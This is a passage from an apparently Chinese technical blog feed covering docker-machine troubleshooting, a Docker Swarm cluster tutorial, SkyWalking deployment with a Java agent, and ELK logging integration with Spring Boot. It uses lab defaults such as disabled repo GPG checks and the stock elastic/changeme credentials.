<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[virtualbox]</span><br><span class="line">name&#x3D;Oracle Linux &#x2F; RHEL &#x2F; CentOS-$releasever &#x2F; $basearch - VirtualBox</span><br><span class="line">baseurl&#x3D;http:&#x2F;&#x2F;download.virtualbox.org&#x2F;virtualbox&#x2F;rpm&#x2F;el&#x2F;$releasever&#x2F;$basearch</span><br><span class="line">enabled&#x3D;1</span><br><span class="line">gpgcheck&#x3D;0</span><br><span class="line">repo_gpgcheck&#x3D;0</span><br><span class="line">gpgkey&#x3D;https:&#x2F;&#x2F;www.virtualbox.org&#x2F;download&#x2F;oracle_vbox.asc</span><br></pre></td></tr></table></figure>
<p>使用命令查看VirtualBox版本，选择指定版本进行安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum search VirtualBox</span><br></pre></td></tr></table></figure>
<p>输出： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; N&#x2F;S matched: VirtualBox &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;_</span><br><span class="line">_VirtualBox-4.3.x86_64 : Oracle VM VirtualBox_ </span><br><span class="line">_VirtualBox-5.0.x86_64 : Oracle VM VirtualBox_ </span><br><span class="line">_VirtualBox-5.1.x86_64 : Oracle VM VirtualBox_ </span><br><span class="line">_VirtualBox-5.2.x86_64 : Oracle VM VirtualBox_ </span><br></pre></td></tr></table></figure>
<p>安装命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y VirtualBox-5.2</span><br><span class="line">sudo /sbin/vboxconfig</span><br></pre></td></tr></table></figure>
<p><strong>错误2:</strong><br>在执行命令“sudo /sbin/vboxconfig”时，提示如下： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_This system is currently not set up to build kernel modules.</span><br><span class="line">_Please install the Linux kernel &quot;header&quot; files matching the current kernel_ _for adding new hardware support to the system. </span><br><span class="line">_The distribution packages containing the headers are probably:_ _kernel-devel kernel-devel-3.10.0-693.2.2.el7.x86_64</span><br><span class="line">_This system is currently not set up to build kernel modules.</span><br><span class="line">_Please install the Linux kernel &quot;header&quot; files matching the current kernel_ _for adding new hardware support to the system.</span><br><span class="line">_The distribution packages containing the headers are probably:_ _kernel-devel kernel-devel-3.10.0-693.2.2.el7.x86_64 </span><br></pre></td></tr></table></figure>
<p>解决方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum update kernel -y</span><br><span class="line">yum install kernel-headers kernel-devel gcc make -y</span><br></pre></td></tr></table></figure>
<p>重启服务器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">init 6</span><br></pre></td></tr></table></figure>
<p><strong>错误3:</strong><br>在执行命令“docker-machine create -d virtualbox test”时，提示错误：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_Running pre-create checks...</span><br><span class="line">_Error with pre-create check: &quot;This computer doesn&#39;t have VT-X&#x2F;AMD-v enabled. </span><br><span class="line">Enabling it in the BIOS is mandatory&quot;_</span><br></pre></td></tr></table></figure>

<p>解决方法：<br>阿里云ECS不支持，无法开启，可以更换为阿里云提供的驱动<strong><em>aliyunecs</em></strong> </p>
<p><strong>错误4:</strong><br>在执行命令“docker-machine create -d aliyunecs testali”时，提示错误:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Driver &quot;aliyunecs&quot; not found. </span><br><span class="line">Do you have the plugin binary &quot;docker-machine-driver-aliyunecs&quot; accessible in your PATH?</span><br></pre></td></tr></table></figure>
<p>解决方法：<br>找不到对应名称的文件，所以，在拷贝到/usr/local/bin目录之前，先修改文件名称，去掉.linux-amd64,如下： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-machine-driver-aliyunecs.linux-amd64 &gt;&gt; docker-machine-driver-aliyunecs </span><br></pre></td></tr></table></figure>
<p><strong>错误5:</strong><br>执行创建主机的时候提示： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error setting machine configuration from flags provided: testali | aliyunecs driver </span><br><span class="line">requires the --aliyunecs-access-key-id option_ </span><br></pre></td></tr></table></figure>
<p>解决方法：<br><strong>aliyunecs-access-key-id</strong>和<strong>aliyunecs-access-key-secret</strong>是必填参数，可以直接在aliyunecs后追加，也可以设置到环境变量当中</p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker三剑客</tag>
        <tag>docker-machine</tag>
      </tags>
  </entry>
  <entry>
    <title>docker三剑客之docker-swarm</title>
    <url>/2018/09/17/docker-docker-swarm/</url>
    <content><![CDATA[<h4 id="扯淡"><a href="#扯淡" class="headerlink" title="扯淡"></a>扯淡</h4><p>集群模式是指在DOCKER引擎中嵌入的集群管理和编排特征。当你初始化一个新的集群或加入一个集群的节点时，DOCKER引擎以集群模式运行。        <br>为什么需要集群？为了解决单机瓶颈，从一到多，部署多份，从而构成“集群”。<br>从单机到集群，代码基本无需修改，仅仅是服务器的扩容，简单直接的提升了服务器的处理能力。  <br>      <br>参考文档：<a href="https://docs.docker.com/engine/swarm/swarm-tutorial/create-swarm">https://docs.docker.com/engine/swarm/swarm-tutorial/create-swarm</a></p>
<h4 id="集群搭建"><a href="#集群搭建" class="headerlink" title="集群搭建"></a>集群搭建</h4><p>我们使用docker-machine来创建几个主机，用来演示swarm集群的创建。</p>
<p>1，先创建3台主机，我这里的命名是：h1 / h2 / h3，用其中的一台主机作为Leader，初始化swarm集群，并管理节点。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine create -d xhyve --xhyve-boot2docker-url ~/.docker/machine/cache/boot2docker.iso --engine-registry-mirror https://registry.docker-cn.com h1</span><br><span class="line"></span><br><span class="line">docker-machine create -d xhyve --xhyve-boot2docker-url ~/.docker/machine/cache/boot2docker.iso --engine-registry-mirror https://registry.docker-cn.com h2</span><br><span class="line"></span><br><span class="line">docker-machine create -d xhyve --xhyve-boot2docker-url ~/.docker/machine/cache/boot2docker.iso --engine-registry-mirror https://registry.docker-cn.com h3</span><br></pre></td></tr></table></figure>
<p>查看创建好的3台主机：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine ls</span><br></pre></td></tr></table></figure>
<p>输出： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_NAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORS_ </span><br><span class="line">_h1 - xhyve Running tcp:&#x2F;&#x2F;192.168.64.5:2376 v18.06.1-ce_ </span><br><span class="line">_h2 - xhyve Running tcp:&#x2F;&#x2F;192.168.64.6:2376 v18.06.1-ce_ </span><br><span class="line">_h3 - xhyve Running tcp:&#x2F;&#x2F;192.168.64.7:2376 v18.06.1-ce_</span><br></pre></td></tr></table></figure>
<p>2，登录h1主机，初始化swarm集群</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine ssh h1</span><br><span class="line">docker swarm init --advertise-addr 192.168.64.5</span><br></pre></td></tr></table></figure>
<p>输出： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_Swarm initialized: </span><br><span class="line">current node (h78ft6qqs27xxi1af9lw7w4tk) is now a manager.</span><br><span class="line">To add a worker to this swarm, run the following </span><br><span class="line"></span><br><span class="line">command:</span><br><span class="line">docker swarm join --token SWMTKN-1-2lk16l2cjvporghr3g1kg6orjrotq682axu2yc0kjm5aepvois-br6bpyng0bvqg2jqcn4ud3cvs 192.168.64.5:2377 </span><br><span class="line"></span><br><span class="line">To add a manager to this swarm, run &#39;docker swarm join-token manager&#39; and follow the instructions.</span><br></pre></td></tr></table></figure>

<p>3，分别登录<strong>h2</strong>和<strong>h3</strong>，执行上面输出的join命令的添加到swarm集群</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker swarm join --token SWMTKN-1-2lk16l2cjvporghr3g1kg6orjrotq682axu2yc0kjm5aepvois-br6bpyng0bvqg2jqcn4ud3cvs 192.168.64.5:2377</span><br></pre></td></tr></table></figure>
<p>输出： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_This node joined a swarm as a worker.</span><br></pre></td></tr></table></figure>
<p>后续，如果需要查看添加节点的token和命令，可以使用如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker swarm join-token worker</span><br></pre></td></tr></table></figure>
<p>4，重新登录h1，查看集群节点情况，<strong>Leader</strong>表示主节点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine ssh h1</span><br><span class="line"></span><br><span class="line">docker node ls</span><br></pre></td></tr></table></figure>
<p>输出： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_ID HOSTNAME STATUS AVAILABILITY MANAGER STATUS ENGINE VERSION_ </span><br><span class="line">_h78ft6qqs27xxi1af9lw7w4tk h1 Ready Active Leader 18.06.1-ce_ </span><br><span class="line">_ifo2uegzz9s1619t72gnz64yk h2 Ready Active 18.06.1-ce_ </span><br><span class="line">_fysd1bc0knxvgkk53604joje2 h3 Ready Active 18.06.1-ce_ </span><br></pre></td></tr></table></figure>

<p>5，移除集群节点 </p>
<p>a，在需要退出的节点上操作下面命令down掉节点，如需强制退出，可添加参数“-f”，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker swarm leave -f</span><br></pre></td></tr></table></figure>
<p>b，到主节点上“docker node ls”列出所有节点，根据id使用命令“docker node rm <id>”删除节点即可，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker node rm &lt;ID&gt;</span><br></pre></td></tr></table></figure>
<p> </p>
<h4 id="服务部署与扩容"><a href="#服务部署与扩容" class="headerlink" title="服务部署与扩容"></a>服务部署与扩容</h4><p>如何将我们的容器部署到swarm集群？下面我们使用nginx来演示。</p>
<p>1，登录主机，执行下面的命令部署nginx服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker service create --replicas 3 -p 80:80 --name nginx nginx:1.15-alpine</span><br></pre></td></tr></table></figure>
<p>2，查看服务部署情况，可以使用下面两个命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker service ls</span><br><span class="line">或</span><br><span class="line">docker service ps nginx</span><br></pre></td></tr></table></figure>
<p>输出： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_ID NAME MODE REPLICAS IMAGE PORTS_ </span><br><span class="line">_26fd9ljhbjsp nginx replicated 3&#x2F;3 nginx:1.15-alpine \*:80-&gt;80&#x2F;tcp_ </span><br></pre></td></tr></table></figure>
<p>现在，我们已经可以在浏览器输入任意一个节点的地址，访问部署到nginx服务了，如访问：“<a href="http://192.168.64.5”/">http://192.168.64.5”</a> </p>
<p>3，服务扩容，我们通过scale命令可以针对集群的服务进行扩容和缩减，控制的数量为当前集群的指定服务数量，一切都变的那么自然，可控。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker service scale nginx=3</span><br></pre></td></tr></table></figure>
<h4 id="集群监控平台"><a href="#集群监控平台" class="headerlink" title="集群监控平台"></a>集群监控平台</h4><p>监控是必须的，这使得 我们可以更直接的观察和管理 集群中的节点和服务，这里我们选用的是Docker Swarm Visualizer，简单直观。</p>
<p>登录管理节点，执行下面的命令添加监控：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker service create \\</span><br><span class="line">--name=viz \\</span><br><span class="line">--publish=8080:8080/tcp \\</span><br><span class="line">--constraint=node.role==manager \\</span><br><span class="line">--mount=<span class="built_in">type</span>=<span class="built_in">bind</span>,src=/var/run/docker.sock,dst=/var/run/docker.sock \\</span><br><span class="line">dockersamples/visualizer</span><br></pre></td></tr></table></figure>
<p>监控部署后，我们就可以通过浏览器访问地址查看：<a href="http://192.168.64.7:8080/">http://192.168.64.7:8080/</a><br>监控效果： </p>
<p align="center">
    <a href="#"><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/docker/viz.jpg" width="450px"></a>
</p>

<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p><strong>docker swarm</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker swarm init #初始化集群 </span><br><span class="line">docker swarm join-token worker #查看工作节点 </span><br><span class="line">token docker swarm join-token manager #查看管理节点 </span><br><span class="line">token docker swarm join #加入集群中 </span><br></pre></td></tr></table></figure>
<p><strong>docker node</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker node ls #查看所有集群节点 </span><br><span class="line">docker node rm #删除某个节点（-f强制删除） </span><br><span class="line">docker node inspect #查看节点详情 </span><br><span class="line">docker node demote #节点降级，由管理节点降级为工作节点 </span><br><span class="line">docker node promote #节点升级，由工作节点升级为管理节点 </span><br><span class="line">docker node update #更新节点 </span><br><span class="line">docker node ps #查看节点中的 Task 任务 </span><br></pre></td></tr></table></figure>
<p><strong>docker service</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker service create #部署服务 </span><br><span class="line">docker service inspect #查看服务详情 </span><br><span class="line">docker service logs #产看某个服务日志 </span><br><span class="line">docker service ls #查看所有服务详情 </span><br><span class="line">docker service rm #删除某个服务（-f强制删除） </span><br><span class="line">docker service scale #设置某个服务个数 </span><br><span class="line">docker service update #更新某个服务</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker三剑客</tag>
        <tag>docker-swarm</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker部署SkyWalking，以及Java项目集成</title>
    <url>/2020/10/01/docker_install_skywalking/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>SkyWalking是一个开源的APM(应用程序性能监视器)系统，专为微服务、云原生和基于容器的体系结构而设计。<br>功能包括对Cloud Native体系结构中的分布式系统的监视，跟踪，诊断，报警等，具体功能明细参见<a href="http://skywalking.apache.org/">官网</a>。</p>
<h4 id="部署skywalking"><a href="#部署skywalking" class="headerlink" title="部署skywalking"></a>部署skywalking</h4><p>本文使用docker-compose的方式进行的部署，官网默认的docker示例是es数据库，es占用内存大，示例机器内存不足，我们直接使用自带的h2数据库来保存skywalking产生的数据。</p>
<p>docker-compose.yml：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.8&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">skywalking-oap:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">apache/skywalking-oap-server:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">skywalking-oap</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">11800</span><span class="string">:11800</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">12800</span><span class="string">:12800</span></span><br><span class="line">    <span class="attr">healthcheck:</span></span><br><span class="line">      <span class="attr">test:</span> [<span class="string">&quot;CMD-SHELL&quot;</span>, <span class="string">&quot;/skywalking/bin/swctl&quot;</span>]</span><br><span class="line">      <span class="attr">interval:</span> <span class="string">30s</span></span><br><span class="line">      <span class="attr">timeout:</span> <span class="string">10s</span></span><br><span class="line">      <span class="attr">retries:</span> <span class="number">3</span></span><br><span class="line">      <span class="attr">start_period:</span> <span class="string">40s</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">JAVA_OPTS:</span> <span class="string">&quot;-Xms512m -Xmx512m&quot;</span></span><br><span class="line">  <span class="attr">skywalking-ui:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">apache/skywalking-ui:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">skywalking-ui</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">skywalking-oap</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">skywalking-oap</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">3380</span><span class="string">:8080</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">SW_OAP_ADDRESS:</span> <span class="string">skywalking-oap:12800</span></span><br></pre></td></tr></table></figure>
<p>执行docker-compose命令，运行skywalking：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h4 id="下载skywalking-agent-jar"><a href="#下载skywalking-agent-jar" class="headerlink" title="下载skywalking-agent.jar"></a>下载skywalking-agent.jar</h4><p>下载地址：<a href="http://skywalking.apache.org/downloads/">http://skywalking.apache.org/downloads/</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -p /home/pro-mall/</span><br><span class="line"><span class="built_in">cd</span> /home/pro-mall/</span><br><span class="line">wget https://mirror.bit.edu.cn/apache/skywalking/8.1.0/apache-skywalking-apm-8.1.0.tar.gz</span><br><span class="line">tar -zxvf apache-skywalking-apm-8.1.0.tar.gz </span><br><span class="line"></span><br><span class="line"><span class="comment"># skywalking-agent.jar文件完整地址</span></span><br><span class="line">/home/pro-mall/apache-skywalking-apm-bin/agent/skywalking-agent.jar</span><br><span class="line"><span class="comment"># agent参数介绍</span></span><br><span class="line">/home/pro-mall/apache-skywalking-apm-bin/agent/config/agent.config</span><br></pre></td></tr></table></figure>
<h4 id="项目使用"><a href="#项目使用" class="headerlink" title="项目使用"></a>项目使用</h4><p>以agent的方式启动，对代码没有侵入性，直接在启动命令上指定javaagent即可。</p>
<p>启动命令javaagent参数添加：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -javaagent:/home/pro-mall/apache-skywalking-apm-bin/agent/skywalking-agent.jar -DSW_AGENT_COLLECTOR_BACKEND_SERVICES=127.0.0.1:11800 -DSW_AGENT_NAME=pro-mall -jar xxxxx</span><br></pre></td></tr></table></figure>
<p>启动程序后，登录skywalking查看监控情况：<a href="http://localhost:3380/">http://localhost:3380</a></p>
<p>监控面板：<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/skywalking/sk1.png" alt="监控面板"></p>
<p>调用链路：<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/skywalking/sk2.png" alt="调用链路"></p>
]]></content>
      <categories>
        <category>docker</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>SkyWalking</tag>
        <tag>监控</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建ELK日志服务和SpringBoot集成</title>
    <url>/2020/09/08/elk-log-springboot/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>一个完整软件系统，日志服务是必不可少的一环，定位问题，分析日志都需要它的帮助，现在市面上用的比较多的日志服务方案是ELK，我看看如何来搭建集成。</p>
<p>ELK代表：Elasticsearch、Logstash、Kibana<br>Elasticsearch - 实时全文搜索和分析引擎，提供搜集、分析、存储数据功能<br>Logstash - 用来搜集、分析、过滤日志的工具<br>Kibana - Web的图形界面，用于搜索、分析和可视化存储在 Elasticsearch指标中的日志数据</p>
<p>我们用个简单的架构来演示：ELK + SpringBoot</p>
<h4 id="ELK日志服务搭建"><a href="#ELK日志服务搭建" class="headerlink" title="ELK日志服务搭建"></a>ELK日志服务搭建</h4><p>这里我们采用的是docker的方式来进行的搭建，直接在github上找了一个开源项目docker-elk，快速简单的完成搭建。</p>
<h5 id="构建镜像运行容器"><a href="#构建镜像运行容器" class="headerlink" title="构建镜像运行容器"></a>构建镜像运行容器</h5><p>下面的命令直接就可以构建并运行elk：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;deviantony&#x2F;docker-elk.git</span><br><span class="line">cd docker-elk</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>注：因为仓库里的yml配置的是build命令。所以每次up -d都会重新构建镜像，因此，构建完成后，后续启动建议时间start命令。</p>
<p>或者也可以将yml的build命令修改为指定的image+版本，可以更好的管理容器版本，如项目中的docker-stack.yml文件示例。</p>
<p>启动完成后，浏览器打开：<a href="http://localhost:5601/">http://localhost:5601/</a> 即可访问kibana页面，默认账号/密码：elastic/changeme。</p>
<p>如果需要清理容器的持久数据，可以执行下面的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose down -v</span><br></pre></td></tr></table></figure>
<h5 id="调整核心配置"><a href="#调整核心配置" class="headerlink" title="调整核心配置"></a>调整核心配置</h5><p>这些设置是构建镜像的时候的一些默认设置，正常情况下，不需要更改，docker-compose端口映射和相关配置 足以满足我们的需求。</p>
<h6 id="ES配置"><a href="#ES配置" class="headerlink" title="ES配置"></a>ES配置</h6><p>在docker-compose.yml文件中，可指定内存大小、密码、以及模式等，如：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">environment:</span></span><br><span class="line">      <span class="attr">ES_JAVA_OPTS:</span> <span class="string">&quot;-Xmx256m -Xms256m&quot;</span></span><br><span class="line">      <span class="attr">ELASTIC_PASSWORD:</span> <span class="string">changeme</span></span><br><span class="line">      <span class="comment"># Use single node discovery in order to disable production mode and avoid bootstrap checks</span></span><br><span class="line">      <span class="comment"># see https://www.elastic.co/guide/en/elasticsearch/reference/current/bootstrap-checks.html</span></span><br><span class="line">      <span class="attr">discovery.type:</span> <span class="string">single-node</span></span><br></pre></td></tr></table></figure>
<h6 id="Logsstash配置"><a href="#Logsstash配置" class="headerlink" title="Logsstash配置"></a>Logsstash配置</h6><p>文件路径：./logstash/config/logstash.yml<br>配置内容：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Default Logstash configuration from Logstash base image.</span></span><br><span class="line"><span class="comment">## https://github.com/elastic/logstash/blob/master/docker/data/logstash/config/logstash-full.yml</span></span><br><span class="line"><span class="attr">http.host:</span> <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line"><span class="attr">xpack.monitoring.elasticsearch.hosts:</span> [ <span class="string">&quot;http://elasticsearch:9200&quot;</span> ]</span><br><span class="line"></span><br><span class="line"><span class="comment">## X-Pack security credentials</span></span><br><span class="line"><span class="attr">xpack.monitoring.enabled:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">xpack.monitoring.elasticsearch.username:</span> <span class="string">elastic</span></span><br><span class="line"><span class="attr">xpack.monitoring.elasticsearch.password:</span> <span class="string">changeme</span></span><br></pre></td></tr></table></figure>
<p>注：这里需指定es的认证密码、地址和端口</p>
<p>另外，Logsstash还有一个数据输入端口input设置：<br>文件路径：./logstash/pipeline/logstash.conf<br>配置内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">	tcp &#123;</span><br><span class="line">		port =&gt; 5000</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">output &#123;</span><br><span class="line">	elasticsearch &#123;</span><br><span class="line">		hosts =&gt; <span class="string">&quot;elasticsearch:9200&quot;</span></span><br><span class="line">		user =&gt; <span class="string">&quot;elastic&quot;</span></span><br><span class="line">		password =&gt; <span class="string">&quot;changeme&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Kibana配置"><a href="#Kibana配置" class="headerlink" title="Kibana配置"></a>Kibana配置</h6><p>文件路径：./kibana/config/kibana.yml<br>配置内容：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Default Kibana configuration from Kibana base image.</span></span><br><span class="line"><span class="comment">## https://github.com/elastic/kibana/blob/master/src/dev/build/tasks/os_packages/docker_generator/templates/kibana_yml.template.js</span></span><br><span class="line"><span class="attr">server.name:</span> <span class="string">kibana</span></span><br><span class="line"><span class="attr">server.host:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="attr">elasticsearch.hosts:</span> [ <span class="string">&quot;http://elasticsearch:9200&quot;</span> ]</span><br><span class="line"><span class="attr">monitoring.ui.container.elasticsearch.enabled:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## X-Pack security credentials</span></span><br><span class="line"><span class="attr">elasticsearch.username:</span> <span class="string">elastic</span></span><br><span class="line"><span class="attr">elasticsearch.password:</span> <span class="string">changeme</span></span><br></pre></td></tr></table></figure>
<p>注：同样的，这里也需指定es的认证密码、地址和端口</p>
<h4 id="SpringBoot项目配置"><a href="#SpringBoot项目配置" class="headerlink" title="SpringBoot项目配置"></a>SpringBoot项目配置</h4><h5 id="pom文件配置"><a href="#pom文件配置" class="headerlink" title="pom文件配置"></a>pom文件配置</h5><p>引入logstash-logback-encoder，它负责链接logstash服务，推送程序日志：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">logstash.version</span>&gt;</span>6.4<span class="tag">&lt;/<span class="name">logstash.version</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.logstash.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logstash-logback-encoder<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;logstash.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h5 id="logback-boot-xml配置"><a href="#logback-boot-xml配置" class="headerlink" title="logback-boot.xml配置"></a>logback-boot.xml配置</h5><p>修改项目的logback-boot.xml，配置logstash的日志追加器，因为此案例是在本地搭建的，所以logstash的地址使用的是127.0.0.1，端口是5000。</p>
<p>如果不清楚端口，可以通过查看docker-compose文件查看到 配置暴露在宿主机上的端口</p>
<p>logback-boot.xml配置示例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- %m输出的信息,%p日志级别,%t线程名,%d日期,%c类的全名,%i索引【从数字0开始递增】 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- appender是configuration的子节点，是负责写日志的组件。 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ConsoleAppender：把日志输出到控制台 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;STDOUT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d %p (%file:%line\)- %m%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 控制台也要使用UTF-8，不要使用GBK，否则会中文乱码 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">charset</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- RollingFileAppender：滚动记录文件，先将日志记录到指定文件，当符合某个条件时，将日志记录到其他文件 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 以下的大概意思是：1.先按日期存日志，日期变了，将前一天的日志文件名重命名为XXX%日期%索引，新的日志仍然是demo.log --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--             2.如果日期没有发生变化，但是当前日志的文件大小超过1KB时，对当前日志进行分割 重命名--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;APILOG&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">File</span>&gt;</span>log/api.log<span class="tag">&lt;/<span class="name">File</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- rollingPolicy:当发生滚动时，决定 RollingFileAppender 的行为，涉及文件移动和重命名。 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- TimeBasedRollingPolicy： 最常用的滚动策略，它根据时间来制定滚动策略，既负责滚动也负责出发滚动 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span 